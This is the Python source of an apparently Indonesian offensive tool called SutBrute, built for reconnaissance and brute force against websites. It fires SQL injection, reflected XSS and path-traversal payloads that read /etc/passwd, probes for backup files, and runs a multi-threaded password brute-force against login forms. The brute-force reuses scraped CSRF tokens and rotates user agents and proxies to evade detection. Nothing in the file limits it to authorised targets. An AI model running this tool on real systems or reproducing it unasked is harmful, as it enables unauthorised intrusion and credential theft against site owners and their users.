#!/usr/bin/env python3
"""
SutBrute v2.1 - R3X Edition
Recon + Brute Force tool with API key support
"""
import requests
from bs4 import BeautifulSoup
import argparse
import sys
import time
import random
import json
import os
from concurrent.futures import ThreadPoolExecutor, as_completed

VERSION = "2.1"
CONFIG_FILE = "config/config.json"

def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE) as f:
            return json.load(f)
    return {"api_key": "SUTBRUTE-FREE-2026", "proxy_list": [], "user_agents": []}

CONFIG = load_config()
API_KEY = CONFIG.get("api_key", "SUTBRUTE-FREE-2026")
USER_AGENTS = CONFIG.get("user_agents", [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
])
PROXY_LIST = CONFIG.get("proxy_list", [])

def get_session():
    s = requests.Session()
    s.headers.update({"User-Agent": random.choice(USER_AGENTS), "X-API-Key": API_KEY})
    if PROXY_LIST:
        proxy = random.choice(PROXY_LIST)
        s.proxies = {"http": proxy, "https": proxy}
    return s

def banner():
    print("""
    ╔═══════════════════════════════════╗
    ║  SutBrute v{} - R3X Edition      ║
    ║  \"Sut silet, tembus celah.\"      ║
    ╚═══════════════════════════════════╝
    """.format(VERSION))

def scan_vuln(url, threads=5):
    print(f"[*] Scanning {url} with {threads} threads")
    found = []
    s = get_session()
    
    def test_payload(payload_type, test_url):
        try:
            r = s.get(test_url, timeout=5)
            if payload_type == "sqli":
                if any(x in r.text.lower() for x in ["sql", "mysql", "syntax", "error"]):
                    return f"[SQLi] Potensi di {test_url}"
            elif payload_type == "xss":
                if "<script>alert('SutBrute')</script>" in r.text:
                    return f"[XSS] Reflected di {test_url}"
            elif payload_type == "lfi":
                if "root:" in r.text or "bin:" in r.text:
                    return f"[LFI] Path traversal di {test_url}"
        except:
            pass
        return None
    
    tasks = []
    for param in ["id", "page", "q"]:
        tasks.append(("sqli", url + "?" + param + "=' OR '1'='1"))
    tasks.append(("xss", url + "?q=<script>alert('SutBrute')</script>"))
    tasks.append(("lfi", url + "?file=../../../../etc/passwd"))
    for ext in [".bak", ".old", ".swp", "~"]:
        tasks.append(("backup", url + ext))
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        future_to_task = {executor.submit(test_payload, t[0], t[1]): t for t in tasks}
        for future in as_completed(future_to_task):
            result = future.result()
            if result:
                found.append(result)
    
    return found

def brute_login(url, username_list, password_list, user_field="username", pass_field="password", 
                success_indicator="dashboard", threads=10, max_attempts=None):
    print(f"[*] Brute force on {url} with {threads} threads")
    s = get_session()
    
    try:
        r = s.get(url, timeout=5)
        soup = BeautifulSoup(r.text, "html.parser")
        csrf_token = None
        for inp in soup.find_all("input"):
            if inp.get("name") and "csrf" in inp.get("name").lower():
                csrf_token = inp.get("value")
                break
    except:
        csrf_token = None
    
    found_creds = []
    attempts = 0
    total = len(username_list) * len(password_list)
    if max_attempts and max_attempts < total:
        total = max_attempts
    
    def try_login(user, pwd):
        nonlocal attempts
        if max_attempts and attempts >= max_attempts:
            return None
        attempts += 1
        data = {user_field: user, pass_field: pwd}
        if csrf_token:
            data["csrf_token"] = csrf_token
        try:
            resp = s.post(url, data=data, timeout=5, allow_redirects=True)
            if success_indicator.lower() in resp.text.lower() or resp.url != url:
                return (user, pwd, resp.status_code)
        except:
            pass
        time.sleep(random.uniform(0.1, 0.5))
        return None
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for user in username_list[:max_attempts//len(password_list) if max_attempts else len(username_list)]:
            for pwd in password_list:
                futures.append(executor.submit(try_login, user, pwd))
        
        for future in as_completed(futures):
            result = future.result()
            if result:
                found_creds.append(result)
                print(f"[+] VALID: {result[0]}:{result[1]}")
                return found_creds
    
    return found_creds

def main():
    parser = argparse.ArgumentParser(description="SutBrute - Recon & Brute Force")
    parser.add_argument("mode", choices=["recon", "brute"], help="Mode operasi")
    parser.add_argument("target", help="Target URL")
    parser.add_argument("-u", "--users", help="File userlist untuk brute")
    parser.add_argument("-p", "--passwords", help="File passwordlist untuk brute")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Jumlah thread (default: 5)")
    parser.add_argument("-U", "--user-field", default="username", help="Field username")
    parser.add_argument("-P", "--pass-field", default="password", help="Field password")
    parser.add_argument("-s", "--success", default="dashboard", help="Indikator sukses (string di response)")
    parser.add_argument("-m", "--max-attempts", type=int, help="Maksimal percobaan")
    args = parser.parse_args()
    
    banner()
    
    if args.mode == "recon":
        results = scan_vuln(args.target, args.threads)
        for r in results:
            print(r)
        if not results:
            print("[*] Gak nemu celah signifikan. Coba manual.")
    
    elif args.mode == "brute":
        if not args.users or not args.passwords:
            print("[!] Harus pake -u dan -p untuk file wordlist")
            sys.exit(1)
        with open(args.users) as f:
            users = [l.strip() for l in f if l.strip()]
        with open(args.passwords) as f:
            passwords = [l.strip() for l in f if l.strip()]
        print(f"[*] Total kombinasi: {len(users)*len(passwords)}")
        found = brute_login(args.target, users, passwords, args.user_field, args.pass_field,
                           args.success, args.threads, args.max_attempts)
        if found:
            print(f"\n[+] Credentials ditemukan: {found}")
        else:
            print("\n[-] Gak ada yang valid.")

if __name__ == "__main__":
    main()
